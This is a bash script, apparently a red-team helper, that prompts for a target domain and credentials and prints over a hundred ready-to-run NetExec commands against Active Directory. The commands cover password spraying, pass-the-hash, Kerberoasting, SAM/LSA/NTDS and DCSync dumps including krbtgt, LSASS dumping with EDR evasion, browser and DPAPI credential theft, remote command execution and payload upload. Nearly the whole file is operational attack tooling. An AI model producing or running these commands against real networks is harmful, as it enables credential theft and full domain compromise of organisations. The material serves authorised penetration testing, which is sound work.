#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  NXC-GEN v2.0 — NetExec One-Liner Command Generator                    ║
# ║  Senior Red Team Edition | 130+ Commands | Smart Conditional Output     ║
# ╚══════════════════════════════════════════════════════════════════════════╝

VERSION="2.0"

# ── ANSI Colors ───────────────────────────────────────────────────────────
R=$'\033[0;31m';    GR=$'\033[0;32m';   Y=$'\033[1;33m';    B=$'\033[0;34m'
C=$'\033[0;36m';    M=$'\033[0;35m';    O=$'\033[38;5;208m'; W=$'\033[1;37m'
DIM=$'\033[2m';     NC=$'\033[0m';      BD=$'\033[1m';       UL=$'\033[4m'
BR=$'\033[1;31m';   BG=$'\033[1;32m';   BY=$'\033[1;33m';   BC=$'\033[1;36m'
BM=$'\033[1;35m';   BO=$'\033[1;38;5;208m'
# Backgrounds
BG_R=$'\033[41m';   BG_G=$'\033[42m';   BG_B=$'\033[44m';   BG_Y=$'\033[43m'
BG_C=$'\033[46m';   BG_M=$'\033[45m';   BG_D=$'\033[100m'
# 256 color accents
FIRE=$'\033[38;5;196m';  GOLD=$'\033[38;5;220m';  LIME=$'\033[38;5;118m'
SKY=$'\033[38;5;39m';    PINK=$'\033[38;5;213m';   TEAL=$'\033[38;5;43m'
PURP=$'\033[38;5;141m';  PEACH=$'\033[38;5;216m';  MINT=$'\033[38;5;121m'
GRAY=$'\033[38;5;245m';  DKGR=$'\033[38;5;240m'

# ── Symbols ───────────────────────────────────────────────────────────────
OK="${BG}✓${NC}";  FAIL="${BR}✗${NC}";  WARN="${BY}⚠${NC}"
ARROW="${C}➜${NC}"; BULLET="${O}▸${NC}"; STAR="${GOLD}★${NC}"
BOLT="${BY}⚡${NC}"; SKULL="${BR}☠${NC}"; KEY="${GOLD}🔑${NC}"
LOCK="${BR}🔒${NC}"; HACK="${BG}💀${NC}"; EYE="${BC}👁${NC}"
FIRE_E="${FIRE}🔥${NC}"; SHIELD="${SKY}🛡${NC}"; TARGET="${BR}🎯${NC}"

# ── Globals (set after input) ─────────────────────────────────────────────
IP=""; SUBNET=""; DC_IP=""; DOMAIN=""
USER=""; PASS=""; ADMIN_USER=""; ADMIN_HASH=""
AES_KEY=""; CCACHE=""
HAS_ADMIN=false; HAS_AES=false; HAS_CCACHE=false
OUTPUT_FILE=""

# ═══════════════════════════════════════════════════════════════════════════
# DISPLAY HELPERS
# ═══════════════════════════════════════════════════════════════════════════
banner() {
    clear
    echo ""
    echo -e "${BD}${FIRE}"
    cat << 'EOF'
    ██████╗ ██╗  ██╗ ██████╗     ██████╗ ███████╗███╗   ██╗
    ████╗  ██║╚██╗██╔╝██╔════╝   ██╔════╝ ██╔════╝████╗  ██║
    ██╔██╗ ██║ ╚███╔╝ ██║        ██║  ███╗█████╗  ██╔██╗ ██║
    ██║╚██╗██║ ██╔██╗ ██║        ██║   ██║██╔══╝  ██║╚██╗██║
    ██║ ╚████║██╔╝ ██╗╚██████╗   ╚██████╔╝███████╗██║ ╚████║
    ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝    ╚═════╝ ╚══════╝╚═╝  ╚═══╝
EOF
    echo -e "${NC}"
    echo -e "    ${BD}${GOLD}NetExec One-Liner Command Generator${NC} ${DIM}v${VERSION}${NC}"
    echo -e "    ${TEAL}Senior Red Team Edition${NC} ${DIM}│${NC} ${PEACH}130+ Commands${NC} ${DIM}│${NC} ${MINT}Smart Conditional Output${NC}"
    echo -e ""
    echo -e "    ${DIM}─────────────────────────────────────────────────────────────${NC}"
    echo ""
}

# Phase header — big colorful box
phase_header() {
    local num="$1" title="$2" count="$3" color="$4" icon="$5"
    echo -e ""
    echo -e "${BD}${color}╔════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BD}${color}║ ${icon}  PHASE ${num}: ${title}  ${DIM}(${count} commands)${NC}${BD}${color}${NC}"
    echo -e "${BD}${color}╚════════════════════════════════════════════════════════════════════════╝${NC}"
    echo -e ""
}

# Section header
section() {
    local title="$1" icon="$2"
    echo -e "${BD}${SKY}${icon} ${title}${NC}"
    echo -e "${DKGR}─────────────────────────────────────────────────────────────────────────${NC}"
}

# Formatted command with comment
cmd() {
    local comment="$1"; shift
    local command="$*"
    echo -e "${DKGR}# ${GRAY}${comment}${NC}"
    echo -e "${BG}${command}${NC}"
    echo ""
}

# Conditional command — only printed if condition met
cmd_if() {
    local condition="$1" comment="$2"; shift 2
    local command="$*"
    case "$condition" in
        admin)  $HAS_ADMIN  || return 0 ;;
        aes)    $HAS_AES    || return 0 ;;
        ccache) $HAS_CCACHE || return 0 ;;
    esac
    cmd "$comment" "$@"
}

# Info line
info() { echo -e "  ${BULLET} ${PEACH}$*${NC}"; }

# Tip line
tip() { echo -e "  ${BOLT} ${BY}TIP:${NC} ${Y}$*${NC}"; }

# Warning line
warn() { echo -e "  ${WARN} ${BR}$*${NC}"; }

# ═══════════════════════════════════════════════════════════════════════════
# INPUT COLLECTION
# ═══════════════════════════════════════════════════════════════════════════
ask() {
    local prompt="$1" default="$2" varname="$3" required="${4:-true}"
    local value=""

    while true; do
        if [[ -n "$default" ]]; then
            echo -ne "  ${SKY}[?]${NC} ${W}${prompt}${NC} ${DIM}[${default}]${NC}: "
        else
            if [[ "$required" == "false" ]]; then
                echo -ne "  ${SKY}[?]${NC} ${W}${prompt}${NC} ${DIM}(Enter to skip)${NC}: "
            else
                echo -ne "  ${SKY}[?]${NC} ${W}${prompt}${NC}: "
            fi
        fi

        read -r value

        # Handle empty input
        if [[ -z "$value" ]]; then
            if [[ -n "$default" ]]; then
                value="$default"
                break
            elif [[ "$required" == "false" ]]; then
                # Optional field — skip is OK
                value=""
                break
            else
                echo -e "  ${BR}  [!] This field is required.${NC}"
                continue
            fi
        fi
        break
    done

    eval "$varname=\"\$value\""
}

ask_secret() {
    local prompt="$1" varname="$2" required="${3:-true}"
    local value=""

    while true; do
        if [[ "$required" == "false" ]]; then
            echo -ne "  ${SKY}[?]${NC} ${W}${prompt}${NC} ${DIM}(Enter to skip)${NC}: "
        else
            echo -ne "  ${SKY}[?]${NC} ${W}${prompt}${NC}: "
        fi

        read -rs value
        echo ""

        if [[ -z "$value" ]]; then
            if [[ "$required" == "false" ]]; then
                value=""
                break
            else
                echo -e "  ${BR}  [!] This field is required.${NC}"
                continue
            fi
        fi
        break
    done

    eval "$varname=\"\$value\""
}

collect_input() {
    echo -e "${BD}${GOLD}  ┌──────────────────────────────────────────────────────┐${NC}"
    echo -e "${BD}${GOLD}  │       ${FIRE_E}  TARGET ENVIRONMENT SETUP  ${FIRE_E}               │${NC}"
    echo -e "${BD}${GOLD}  └──────────────────────────────────────────────────────┘${NC}"
    echo ""

    echo -e "  ${BD}${TEAL}── Network ──${NC}"
    ask "Target IP (single host)"            ""  IP       true
    ask "Target subnet (CIDR)"               "${IP}/24"  SUBNET  true
    ask "Domain Controller IP"               "${IP}"     DC_IP   true
    ask "Domain name (e.g. corp.local)"      ""  DOMAIN   true
    echo ""

    echo -e "  ${BD}${TEAL}── Standard Credentials ──${NC}"
    ask        "Username (valid domain user)" ""  USER  true
    ask_secret "Password"                         PASS  true
    echo ""

    echo -e "  ${BD}${TEAL}── Privileged Credentials ${DIM}(optional — Enter to skip)${NC}"
    ask        "Admin username"               "Administrator"  ADMIN_USER  false
    ask_secret "Admin NTLM hash (32 hex chars)"                ADMIN_HASH  false
    ask_secret "AES256 key"                                    AES_KEY     false
    ask        "Kerberos ccache file path"    ""               CCACHE      false
    echo ""

    # Set flags
    [[ -n "$ADMIN_HASH" ]] && HAS_ADMIN=true
    [[ -n "$AES_KEY" ]]    && HAS_AES=true
    [[ -n "$CCACHE" ]]     && HAS_CCACHE=true

    # Build auth strings used throughout
    AUTH="-u '${USER}' -p '${PASS}'"
    AUTH_D="-u '${USER}' -p '${PASS}' -d ${DOMAIN}"
    if $HAS_ADMIN; then
        ADMIN_AUTH="-u '${ADMIN_USER}' -H '${ADMIN_HASH}'"
    else
        ADMIN_AUTH="-u '${ADMIN_USER}' -p 'YOURPASSWORD'"
    fi

    # Confirmation
    echo -e "${BD}${GOLD}  ┌──────────────────────────────────────────────────────┐${NC}"
    echo -e "${BD}${GOLD}  │           ${OK}  VARIABLES COLLECTED                      │${NC}"
    echo -e "${BD}${GOLD}  └──────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "    ${BULLET} ${W}Target:${NC}  ${BC}${IP}${NC}  ${DIM}(subnet: ${SUBNET})${NC}"
    echo -e "    ${BULLET} ${W}DC:${NC}      ${BC}${DC_IP}${NC}"
    echo -e "    ${BULLET} ${W}Domain:${NC}  ${BY}${DOMAIN}${NC}"
    echo -e "    ${BULLET} ${W}User:${NC}    ${BG}${USER}${NC}"
    echo -e "    ${BULLET} ${W}Admin:${NC}   ${BO}${ADMIN_USER}${NC}  ${DIM}hash:${NC} $( $HAS_ADMIN && echo "${BG}provided${NC}" || echo "${DIM}not set${NC}" )"
    echo -e "    ${BULLET} ${W}AES:${NC}     $( $HAS_AES    && echo "${BG}provided${NC}" || echo "${DIM}skipped${NC}" )"
    echo -e "    ${BULLET} ${W}Ccache:${NC}  $( $HAS_CCACHE  && echo "${BG}${CCACHE}${NC}" || echo "${DIM}skipped${NC}" )"
    echo ""

    TIMESTAMP=$(date '+%Y%m%d_%H%M%S')
    OUTPUT_FILE="nxc_commands_${TIMESTAMP}.txt"
}

# ═══════════════════════════════════════════════════════════════════════════
# COMMAND GENERATION — All 130+ commands, conditionally smart
# ═══════════════════════════════════════════════════════════════════════════
generate() {

# ── File Header ───────────────────────────────────────────────────────
cat << HEADER

${BD}${FIRE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}
${BD}${FIRE}║${NC}  ${BD}${GOLD}    ███╗   ██╗██╗  ██╗ ██████╗     ██████╗ ███████╗███╗   ██╗${NC}           ${BD}${FIRE}║${NC}
${BD}${FIRE}║${NC}  ${BD}${GOLD}    ████╗  ██║╚██╗██╔╝██╔════╝   ██╔════╝ ██╔════╝████╗  ██║${NC}           ${BD}${FIRE}║${NC}
${BD}${FIRE}║${NC}  ${BD}${GOLD}    ██╔██╗ ██║ ╚███╔╝ ██║        ██║  ███╗█████╗  ██╔██╗ ██║${NC}           ${BD}${FIRE}║${NC}
${BD}${FIRE}║${NC}  ${BD}${GOLD}    ██║╚██╗██║ ██╔██╗ ██║        ██║   ██║██╔══╝  ██║╚██╗██║${NC}           ${BD}${FIRE}║${NC}
${BD}${FIRE}║${NC}  ${BD}${GOLD}    ██║ ╚████║██╔╝ ██╗╚██████╗   ╚██████╔╝███████╗██║ ╚████║${NC}           ${BD}${FIRE}║${NC}
${BD}${FIRE}║${NC}  ${BD}${GOLD}    ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝    ╚═════╝ ╚══════╝╚═╝  ╚═══╝${NC}           ${BD}${FIRE}║${NC}
${BD}${FIRE}║${NC}                                                                             ${BD}${FIRE}║${NC}
${BD}${FIRE}║${NC}  ${BD}${SKY}NetExec One-Liner Command Reference${NC}  ${DIM}│${NC}  ${PEACH}Generated: $(date)${NC}   ${BD}${FIRE}║${NC}
${BD}${FIRE}║${NC}  ${BD}${TEAL}Senior Red Team Edition v${VERSION}${NC}       ${DIM}│${NC}  ${MINT}130+ Commands${NC}                     ${BD}${FIRE}║${NC}
${BD}${FIRE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}

${BD}${W}TARGET ENVIRONMENT${NC}
${DKGR}──────────────────────────────────────────────────────────${NC}
  ${BULLET} ${W}Target IP:${NC}      ${BC}${IP}${NC}
  ${BULLET} ${W}Subnet:${NC}         ${BC}${SUBNET}${NC}
  ${BULLET} ${W}DC IP:${NC}          ${BC}${DC_IP}${NC}
  ${BULLET} ${W}Domain:${NC}         ${BY}${DOMAIN}${NC}
  ${BULLET} ${W}Username:${NC}       ${BG}${USER}${NC}
  ${BULLET} ${W}Admin User:${NC}     ${BO}${ADMIN_USER}${NC} $( $HAS_ADMIN && echo " ${BG}(hash provided)${NC}" || echo " ${DIM}(no hash)${NC}" )
  ${BULLET} ${W}AES256:${NC}         $( $HAS_AES    && echo "${BG}provided${NC}" || echo "${DIM}skipped${NC}" )
  ${BULLET} ${W}Ccache:${NC}         $( $HAS_CCACHE  && echo "${BG}${CCACHE}${NC}" || echo "${DIM}skipped${NC}" )

HEADER

# ══════════════════════════════════════════════════════════════════════
# PHASE 1: INITIAL RECONNAISSANCE
# ══════════════════════════════════════════════════════════════════════
phase_header "1" "INITIAL RECONNAISSANCE" "17" "$SKY" "$EYE"

section "Quick Domain Discovery" "$TARGET"

cmd "Check credentials and find admin access across subnet" \
    "nxc smb ${SUBNET} -u '${USER}' -p '${PASS}' --continue-on-success"

cmd "Quick scan single target" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}'"

cmd "Get detailed domain information — passwords in descriptions" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' -M get-desc-users"

cmd "Null session — enumerate shares (no creds)" \
    "nxc smb ${IP} -u '' -p '' --shares"

cmd "Null session — enumerate users (no creds)" \
    "nxc smb ${IP} -u '' -p '' --users"

cmd "Null session — RID brute force (no creds)" \
    "nxc smb ${IP} -u '' -p '' --rid-brute"

section "Enumerate Domain Objects" "$EYE"

cmd "Enumerate ALL domain users" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --users"

cmd "Enumerate ALL domain computers" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --computers"

cmd "Enumerate ALL domain groups" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --groups"

cmd "Find Domain Admins group members" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --groups 'Domain Admins'"

section "Check Domain Configuration" "$SHIELD"

cmd "Machine Account Quota — how many computers you can add (RBCD prereq)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' -M maq"

cmd "Check if ADCS (Certificate Services) is present" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' -M adcs"

section "Share Enumeration" "$LOCK"

cmd "Enumerate SMB shares and permissions" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' --shares"

cmd "Check for writable shares (slinky — drop .lnk for coerced auth)" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' -M slinky"

cmd "Check SMB signing status across subnet — find relay targets" \
    "nxc smb ${SUBNET} --gen-relay-list relay_targets.txt"

cmd "Password policy — CHECK BEFORE SPRAYING" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' --pass-pol"

cmd "Enumerate active sessions on target" \
    "nxc smb ${IP} -u '${USER}' -p '${PASS}' --sessions"

# ══════════════════════════════════════════════════════════════════════
# PHASE 2: CREDENTIAL ATTACKS
# ══════════════════════════════════════════════════════════════════════
phase_header "2" "CREDENTIAL ATTACKS" "12" "$GOLD" "$KEY"

section "Kerberos Attacks" "$BOLT"

cmd "AS-REP Roast — dump hashes for users without Kerberos pre-auth" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --asreproast asrep_hashes.txt"

cmd "Kerberoast — dump service ticket hashes for offline cracking" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' -d ${DOMAIN} --kerberoast kerberoast_hashes.txt"

section "Password Spraying" "${SKULL}"

warn "ALWAYS check --pass-pol FIRST to avoid lockouts!"
echo ""

cmd "Password spray with single password" \
    "nxc smb ${IP} -u users.txt -p 'Password123!' --continue-on-success"

cmd "Password spray with multiple passwords" \
    "nxc smb ${IP} -u users.txt -p passwords.txt --continue-on-success"

cmd "Password spray with delay (stealth — 5 second delay)" \
    "nxc smb ${IP} -u users.txt -p 'Spring2024!' --continue-on-success --delay 5"

cmd "Password spray across entire subnet" \
    "nxc smb ${SUBNET} -u users.txt -p 'Welcome2024!' --continue-on-success"

section "Hash Authentication" "${KEY}"

if $HAS_ADMIN; then
    cmd "Test admin NTLM hash validity" \
        "nxc smb ${IP} -u '${ADMIN_USER}' -H '${ADMIN_HASH}'"

    cmd "Pass-the-Hash across entire subnet" \
        "nxc smb ${SUBNET} -u '${ADMIN_USER}' -H '${ADMIN_HASH}' --continue-on-success"

    cmd "Pass-the-Hash and dump SAM" \
        "nxc smb ${SUBNET} -u '${ADMIN_USER}' -H '${ADMIN_HASH}' --sam --continue-on-success"
else
    cmd "Test admin NTLM hash validity (replace HASH)" \
        "nxc smb ${IP} -u '${ADMIN_USER}' -H 'NTLM_HASH_HERE'"

    cmd "Pass-the-Hash across entire subnet (replace HASH)" \
        "nxc smb ${SUBNET} -u '${ADMIN_USER}' -H 'NTLM_HASH_HERE' --continue-on-success"

    cmd "Pass-the-Hash and dump SAM (replace HASH)" \
        "nxc smb ${SUBNET} -u '${ADMIN_USER}' -H 'NTLM_HASH_HERE' --sam --continue-on-success"
fi

if $HAS_AES; then
    cmd "Authenticate with AES256 key" \
        "nxc smb ${IP} -u '${ADMIN_USER}' --aesKey '${AES_KEY}'"
else
    echo -e "  ${DIM}# AES256 key not provided — skipping AES auth commands${NC}"
    echo ""
fi

if $HAS_CCACHE; then
    cmd "Authenticate with Kerberos ticket (ccache)" \
        "export KRB5CCNAME='${CCACHE}' && nxc smb ${IP} -u '${ADMIN_USER}' --use-kcache -k"
else
    echo -e "  ${DIM}# Ccache not provided — skipping Kerberos ticket auth commands${NC}"
    echo ""
fi

# ══════════════════════════════════════════════════════════════════════
# PHASE 3: KERBEROS & DELEGATION ENUMERATION
# ══════════════════════════════════════════════════════════════════════
phase_header "3" "KERBEROS & DELEGATION ENUMERATION" "10" "$PURP" "$BOLT"

section "Find Kerberoastable Accounts" "$BOLT"

cmd "Find all accounts with SPNs (includes computers)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' -d ${DOMAIN} --query \"(servicePrincipalName=*)\" \"sAMAccountName servicePrincipalName\""

cmd "Find ONLY user accounts with SPNs (Kerberoastable users)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' -d ${DOMAIN} --query \"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))\" \"sAMAccountName servicePrincipalName\""

cmd "Find users without Kerberos pre-auth (AS-REP roastable)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" \"sAMAccountName\""

section "Delegation Enumeration" "$FIRE_E"

cmd "Find accounts trusted for delegation" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --trusted-for-delegation"

cmd "Find accounts with RBCD configured" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(msDS-AllowedToActOnBehalfOfOtherIdentity=*)\" \"sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity\""

cmd "Find unconstrained delegation machines (HIGH VALUE — can capture TGTs!)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" \"sAMAccountName dNSHostName\""

cmd "Find users with TrustedToAuthForDelegation (protocol transition)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=16777216))\" \"sAMAccountName msDS-AllowedToDelegateTo\""

section "Golden Ticket Preparation" "$STAR"

cmd "Find Domain Controllers" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))\" \"sAMAccountName dNSHostName\""

cmd "Find privileged users (adminCount=1)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(adminCount=1))\" \"sAMAccountName memberOf\""

cmd "Find accounts with password never expires" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=65536))\" \"sAMAccountName\""


# ══════════════════════════════════════════════════════════════════════
# PHASE 4: SECRETS & CREDENTIAL DUMPING
# ══════════════════════════════════════════════════════════════════════
phase_header "4" "SECRETS & CREDENTIAL DUMPING" "18" "$BR" "$SKULL"

# Build the admin auth string for display
local AAUTH
if $HAS_ADMIN; then
    AAUTH="-u '${ADMIN_USER}' -H '${ADMIN_HASH}'"
else
    AAUTH="-u '${ADMIN_USER}' -H 'NTLM_HASH_HERE'"
fi

if ! $HAS_ADMIN; then
    warn "Admin hash not provided — commands below use placeholder. Replace NTLM_HASH_HERE."
    echo ""
fi

section "Local Credential Extraction" "${KEY}"

cmd "Dump SAM database (local user hashes)" \
    "nxc smb ${IP} ${AAUTH} --sam"

cmd "Dump LSA secrets (cached credentials, service account passwords)" \
    "nxc smb ${IP} ${AAUTH} --lsa"

cmd "Dump both SAM and LSA" \
    "nxc smb ${IP} ${AAUTH} --sam --lsa"

cmd "Dump SAM across entire subnet" \
    "nxc smb ${SUBNET} ${AAUTH} --sam --continue-on-success"

section "Domain Credential Extraction (DCSync)" "${SKULL}"

cmd "DCSync — dump ALL domain password hashes" \
    "nxc smb ${DC_IP} ${AAUTH} --ntds"

cmd "DCSync — krbtgt only (for Golden Ticket)" \
    "nxc smb ${DC_IP} ${AAUTH} --ntds --user krbtgt"

cmd "DCSync — Administrator only" \
    "nxc smb ${DC_IP} ${AAUTH} --ntds --user Administrator"

cmd "DCSync with drsuapi method (alternative)" \
    "nxc smb ${DC_IP} ${AAUTH} --ntds drsuapi"

section "LAPS & GMSA Password Extraction" "${LOCK}"

cmd "Dump ALL LAPS passwords" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' -M laps"

cmd "Dump LAPS for specific computer" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' -M laps -o computer=${IP}"

cmd "Dump GMSA (Group Managed Service Account) passwords" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --gmsa"

section "Memory Credential Extraction" "${FIRE_E}"

cmd "LSASS dump via lsassy (most reliable)" \
    "nxc smb ${IP} ${AAUTH} -M lsassy"

cmd "LSASS dump via nanodump (EDR evasion)" \
    "nxc smb ${IP} ${AAUTH} -M nanodump"

cmd "LSASS dump via procdump (Microsoft-signed binary)" \
    "nxc smb ${IP} ${AAUTH} -M procdump"

cmd "Harvest credentials across subnet with lsassy" \
    "nxc smb ${SUBNET} ${AAUTH} -M lsassy --continue-on-success"

section "Additional Secrets" "${KEY}"

cmd "Extract browser credentials (Chrome, Firefox, Edge)" \
    "nxc smb ${IP} ${AAUTH} -M browser_dump"

cmd "Dump WiFi passwords" \
    "nxc smb ${IP} ${AAUTH} -M wireless"

cmd "Dump DPAPI secrets (Chrome passwords, WiFi, vault creds)" \
    "nxc smb ${IP} ${AAUTH} -M dpapi"


# ══════════════════════════════════════════════════════════════════════
# PHASE 5: BLOODHOUND DATA COLLECTION
# ══════════════════════════════════════════════════════════════════════
phase_header "5" "BLOODHOUND DATA COLLECTION" "5" "$BG" "$HACK"

section "BloodHound Collection Methods" "$TARGET"

cmd "Collect ALL BloodHound data via LDAP (stealthy, no admin required)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --bloodhound --collection All"

cmd "BloodHound with specific output directory" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --bloodhound -c All --bloodhound-dir /tmp/bloodhound_data"

cmd "Quick collection (ACLs and Trusts only — fastest)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --bloodhound --collection ACL,Trusts"

cmd "Collect specific data types (Group, LocalAdmin, Session, Trusts)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --bloodhound -c Group,LocalAdmin,Session,Trusts"

cmd "Collect via SMB with admin (includes sessions — more complete)" \
    "nxc smb ${IP} ${AAUTH} --bloodhound --collection All"


# ══════════════════════════════════════════════════════════════════════
# PHASE 6: ADVANCED LDAP QUERIES
# ══════════════════════════════════════════════════════════════════════
phase_header "6" "ADVANCED LDAP QUERIES" "20" "$TEAL" "$EYE"

section "Find Weak Configurations" "$WARN"

cmd "Find users with 'password' in description field (often contains actual passwords!)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(description=*password*)\" \"sAMAccountName description\""

cmd "Find users with passwords set to never expire" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=65536))\" \"sAMAccountName\""

cmd "Find users with empty passwords" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=32))\" \"sAMAccountName\""

cmd "Find users who can't change password" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=64))\" \"sAMAccountName\""

cmd "Find users with password not required" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=32))\" \"sAMAccountName\""

section "Find Active/Inactive Objects" "$EYE"

cmd "Find enabled computers (active machines only)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))\" \"sAMAccountName dNSHostName operatingSystem\""

cmd "Find disabled user accounts" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=2))\" \"sAMAccountName\""

cmd "Find users who never logged in" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(!(lastLogon=*)))\" \"sAMAccountName\""

cmd "Find user accounts created in last 30 days" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(whenCreated>=$(date -d '-30 days' '+%Y%m%d' 2>/dev/null || echo '20240101')000000.0Z))\" \"sAMAccountName whenCreated\""

section "Find High-Value Targets" "$STAR"

cmd "Find computers with LAPS enabled" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(ms-Mcs-AdmPwd=*)\" \"sAMAccountName ms-Mcs-AdmPwd\""

cmd "Find all GPOs (Group Policy Objects)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(objectClass=groupPolicyContainer)\" \"displayName gPCFileSysPath\""

cmd "Find OUs (Organizational Units)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(objectClass=organizationalUnit)\" \"name distinguishedName\""

cmd "Find Windows Server 2019 machines" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(operatingSystem=*Server 2019*)\" \"sAMAccountName dNSHostName operatingSystem\""

cmd "Find Windows 10 machines" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(operatingSystem=*Windows 10*)\" \"sAMAccountName dNSHostName operatingSystem\""

cmd "Find users with old passwords (stale accounts)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(pwdLastSet<=132850000000000000))\" \"sAMAccountName pwdLastSet\""

section "Advanced Queries" "$BOLT"

cmd "Find users with description field set (often useful info/passwords)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(description=*))\" \"sAMAccountName description\""

cmd "Find users with email addresses" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(mail=*))\" \"sAMAccountName mail\""

cmd "Find users with home directories" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(homeDirectory=*))\" \"sAMAccountName homeDirectory\""

cmd "Find service accounts (by naming convention)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(sAMAccountName=*svc*))\" \"sAMAccountName description\""

cmd "Find admin accounts (by naming convention)" \
    "nxc ldap ${DC_IP} -u '${USER}' -p '${PASS}' --query \"(&(objectCategory=person)(|(sAMAccountName=*admin*)(sAMAccountName=*adm*)))\" \"sAMAccountName\""


# ══════════════════════════════════════════════════════════════════════
# PHASE 7: COMMAND EXECUTION & POST-EXPLOITATION
# ══════════════════════════════════════════════════════════════════════
phase_header "7" "COMMAND EXECUTION & POST-EXPLOITATION" "15" "$BO" "$HACK"

if ! $HAS_ADMIN; then
    warn "Admin hash not provided — commands below use placeholder."
    echo ""
fi

section "Remote Command Execution" "$TARGET"

cmd "Execute whoami on target" \
    "nxc smb ${IP} ${AAUTH} -x 'whoami'"

cmd "Get system information" \
    "nxc smb ${IP} ${AAUTH} -x 'systeminfo'"

cmd "List running processes" \
    "nxc smb ${IP} ${AAUTH} -x 'tasklist'"

cmd "Execute command across entire subnet" \
    "nxc smb ${SUBNET} ${AAUTH} -x 'whoami' --continue-on-success"

cmd "Execute PowerShell command" \
    "nxc smb ${IP} ${AAUTH} -X '\$PSVersionTable'"

cmd "PowerShell — get top 10 processes" \
    "nxc smb ${IP} ${AAUTH} -X 'Get-Process | Select-Object -First 10'"

section "File Operations" "$LOCK"

cmd "Upload file to target" \
    "nxc smb ${IP} ${AAUTH} --put-file /tmp/payload.exe 'C:\\Windows\\Temp\\payload.exe'"

cmd "Download file from target" \
    "nxc smb ${IP} ${AAUTH} --get-file 'C:\\Windows\\System32\\config\\SAM' /tmp/SAM"

section "Share Spidering" "$EYE"

cmd "Spider shares for interesting files" \
    "nxc smb ${IP} ${AAUTH} -M spider_plus"

cmd "Spider with automatic file download" \
    "nxc smb ${IP} ${AAUTH} -M spider_plus -o DOWNLOAD_FLAG=true"

